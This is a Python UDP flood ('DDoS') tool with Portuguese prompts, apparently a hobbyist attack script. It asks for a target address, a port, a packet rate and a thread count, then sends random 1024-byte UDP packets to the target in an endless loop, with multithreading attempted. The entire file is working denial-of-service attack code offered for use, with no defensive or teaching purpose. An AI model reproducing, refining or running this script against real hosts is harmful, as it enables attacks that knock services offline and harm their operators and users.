#BY GP_ANGEL


import os
import random
import sys
import socket
import threading
import ipaddress

os.system("clear")

class Colors:
	Black = "\033[30m"
	Red = "\033[31m"
	Green = "\033[32m"
	Orange = "\033[33m"
	Blue = "\033[34m"
	Purple = "\033[35m"
	Cyan = "\033[36m"
	LightGrey = "\033[37m"
	DarkGrey = "\033[90m"
	LightRed = "\033[91m"
	LightGreen = "\033[92m"
	Yellow = "\033[93m"
	LightBlue = "\033[94m"
	Pink = "\033[95m"
	LightCyan = "\033[96m"
	Reset = "\033[0m"
	
os.system('clear' if os.name == 'posix' else 'cls')

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip_run, port_run, times_run, threads_run):
    data_run = random._urandom(1024)

    try:
        while True:
            print("\033[1;31m[*]\033[0m \033[1mSending UDP packets to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""!")
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))

            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()

    except KeyboardInterrupt:
        print(":P""")
        sys.exit(0)

    except Exception as e:
        sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")

def main():
    print("")
    print("")
    os.system("pyfiglet -c RED -f big DDoS")
    
    while True:
        try:
            target = input("\033[1;31mEndereço:\033[0m ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("")
        except KeyboardInterrupt:
            print("")
            sys.exit(0)
            
    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            os.system("clear")
            os.system("pyfiglet -c RED -f big DDoS")
        except socket.error as e:
            os.system("clear")
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(input("\033[1;31m\033[31mPortal: \033[1;0m"))
            break
        except ValueError:
            print(" ")
        except KeyboardInterrupt:
            print(":P")
            sys.exit(0)

    while True:
        try:
            os.system("clear")
            os.system("pyfiglet -c RED -f big DDoS")
            print("")
            times_input = input("\n\033[1;31mDigite a Quantidade de Pacotes por Segundo:\033[1;0m ")
            if times_input.strip():  
                
                times = int(times_input)
                break
            
            else:
                print("ERRO!")
        except ValueError:
            print("ERRO!")
        except KeyboardInterrupt:
            print("Volte Sempre!\nBy GP_ANGEL")
            sys.exit(0)

    while True:
        try:
            threads_input = input("\033[1;31mDigite a Quantidade de Threads:\033[31m ")
            if threads_input.strip():
                
                threads = int(threads_input)
                break
            else:
                os.system("clear")
        except ValueError:
            os.system("clear")
        except KeyboardInterrupt:
            os.system("clear")
            sys.exit(0)

    
    data = random._urandom(1024)
    i = random.choice(("\033[1;31m[*]\033[0m", "\033[1;31m[!]\033[0m", "\033[1;31m[#]\033[0m"))
    error_occurred = False
    
    try:
        while True:
            print(f"\033[1;31m[\033[1;0m+\033[1;31m] Enviando Pacotes Para \033[1;0m{ip}\033[1;0m"":"f"{port} \033[1;31mFormato:\033[1;32m UDP")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            s.close()

    except KeyboardInterrupt:
        print(":P")
        sys.exit(0)

    except Exception as e:
        if not error_occurred:
            error_occurred = True
            sys.exit(":P"".")
                
    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads))
        th.start()

if __name__ == "__main__":
    main()
